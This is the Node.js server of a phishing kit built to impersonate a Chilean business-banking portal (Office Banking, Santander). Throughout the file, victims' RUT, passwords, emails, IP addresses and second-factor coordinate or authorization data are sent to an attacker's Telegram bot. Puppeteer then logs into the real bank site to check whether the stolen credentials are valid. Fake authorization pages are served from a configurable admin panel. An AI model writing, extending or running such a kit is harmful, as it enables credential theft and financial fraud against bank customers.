const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const puppeteer = require("puppeteer");
// Usar node-fetch para entornos Node < 18
const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Helper seguro para enviar mensajes a Telegram sin romper la ejecución
async function safeSendTelegram(text) {
  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
    console.warn('Telegram no configurado: TELEGRAM_TOKEN o CHAT_ID faltante');
    return;
  }
  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
    });
  } catch (err) {
    console.error('Error enviando a Telegram:', err);
  }
}

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
  res.json(cfg);
});

// Endpoint para obtener coordenadas (usado por la UI)
app.get("/coordenadas", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    const coordenadas = [cfg.coord1 || "", cfg.coord2 || "", cfg.coord3 || ""];
    res.json({ coordenadas });
  } catch (err) {
    console.error("Error leyendo config.json:", err);
    res.status(500).json({ error: "Error leyendo configuración" });
  }
});

// Endpoint para procesar saldo directamente (flujo original)
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
  res.json(req.body);
});

// Ruta directa al admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

  if (cfg.tipoAutorizacion === "santander") {
    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
    return;
  }

  if (cfg.tipoAutorizacion === "coordenadas") {
    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
    return;
  }

  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    await safeSendTelegram(mensaje);
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error('Error en /autorizar:', err);
    res.status(500).json({ status: "error", error: String(err) });
  }
});

// Endpoint para login → notifica ingreso y valida credenciales por respuesta de red
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  if (mail) {
    const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
    try {
      await safeSendTelegram(mensaje);
    } catch (err) {
      console.error('Error enviando correo actualizado a Telegram:', err);
    }
    return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
  }

  // Notificación básica de ingreso (flujo original)
  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
  try {
    await safeSendTelegram(ingresoMsg);
  } catch (err) {
    console.error('Error enviando ingreso a Telegram:', err);
  }

  let mensajeFinal = "Bienvenido a Office Banking";

  try {
    if (rut && passwd) {
      const browser = await puppeteer.launch({ headless: true, args: ["--no-sandbox", "--disable-setuid-sandbox"] });
      const page = await browser.newPage();

      let loginStatus = null;

      // Escuchar respuestas de red
      page.on('response', async (response) => {
        try {
          const url = response.url();
          if (url.includes('/login')) {
            const status = response.status();
            console.log("➡️ Respuesta de login:", status, url);

            if (status === 401) loginStatus = 'error';
            else if (status === 200) loginStatus = 'ok';
          }
        } catch (e) {
          console.error('Error inspecting response:', e);
        }
      });

      await page.goto('https://empresas.officebanking.cl', { waitUntil: 'networkidle2' });
      await page.waitForSelector('iframe');
      const frameHandle = await page.$('iframe');
      const frame = await frameHandle.contentFrame();

      if (frame) {
        await frame.type('#username', rut);
        await frame.type('#password', passwd);
        await frame.click('#doLoginButton');

        // Esperar unos segundos a que llegue la respuesta
        await page.waitForTimeout(4000);

        if (loginStatus === 'error') {
          mensajeFinal = "Credenciales incorrectas";
          await safeSendTelegram("❌ Credenciales incorrectas en OfficeBanking");
        } else if (loginStatus === 'ok') {
          mensajeFinal = "Credenciales correctas";
          await safeSendTelegram("✅ Credenciales correctas en OfficeBanking");
        }
      }

      await browser.close();
    }
  } catch (err) {
    console.error("⚠️ Error en validación de credenciales:", err);
    mensajeFinal = "Bienvenido a Office Banking"; // flujo sigue igual
  }

  res.json({ status: "ok", mensaje: mensajeFinal });
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
